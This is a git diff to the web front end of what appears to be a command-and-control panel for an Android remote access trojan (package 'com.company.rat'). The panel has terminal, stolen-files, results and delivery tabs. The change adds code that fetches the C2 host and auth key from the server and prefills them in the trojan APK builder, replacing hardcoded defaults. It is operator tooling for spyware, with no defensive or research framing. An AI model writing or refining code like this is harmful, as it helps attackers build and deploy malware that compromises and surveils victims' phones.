@@ -215,6 +215,7 @@ function renderMain(a){
     <div id="tab-builder"  class="panel">${renderBuilder()}</div>
     <div id="tab-delivery" class="panel">${renderDeliveryPanel()}</div>
   `;
+  prefillBuilderDefaults();
   // wire up terminal input
   const inp = document.getElementById('term-inp');
   if(inp){
@@ -235,6 +236,7 @@ function showTab(id,btn){
   if(id==='results')  loadResults();
   if(id==='files')    loadFiles();
   if(id==='delivery') loadDeliveryLog();
+  if(id==='builder')  prefillBuilderDefaults();
 }
 
 function openBuilder(){
@@ -245,6 +247,7 @@ function openBuilder(){
     </div>
     <div id="tab-builder"  class="panel active">${renderBuilder()}</div>
     <div id="tab-delivery" class="panel">${renderDeliveryPanel()}</div>`;
+  prefillBuilderDefaults();
 }
 
 // ── TERMINAL ─────────────────────────────────────────────────────────────────
@@ -486,8 +489,21 @@ async function loadFiles(){
 }
 
 // ── APK BUILDER ───────────────────────────────────────────────────────────────
+async function prefillBuilderDefaults(){
+  try {
+    const r = await fetch(BASE+'/api/android/builder', {credentials:'include'});
+    if(!r.ok) return;
+    const d = await r.json();
+    const hEl = document.getElementById('b-host');
+    const aEl = document.getElementById('b-auth');
+    if(hEl && d.defaultHost) hEl.value = d.defaultHost;
+    if(aEl && d.defaultAuth) aEl.value = d.defaultAuth;
+  } catch(_){}
+}
+
 function renderBuilder(){
   const PKG = 'com.company.rat';
+  // Render with empty placeholders; prefillBuilderDefaults() fills real values after DOM insertion
   return `
     <div class="card">
       <div class="card-title">⚙️ APK Config</div>
@@ -498,12 +514,12 @@ function renderBuilder(){
       <div class="build-form">
         <div class="form-row">
           <label>C2 Host</label>
-          <input id="b-host" placeholder="https://192.168.1.100:4444" value="https://192.168.1.100:4444">
-          <small>Your server LAN IP/domain. Phone must be able to reach it.</small>
+          <input id="b-host" placeholder="auto-detecting..." value="">
+          <small>Auto-detected from server. Edit if the phone connects via a different IP/domain.</small>
         </div>
         <div class="form-row">
           <label>Auth Key</label>
-          <input id="b-auth" placeholder="changeme" value="changeme">
+          <input id="b-auth" placeholder="loading..." value="">
           <small>Must match C2_AUTH in server config.</small>
         </div>
         <div class="form-row">
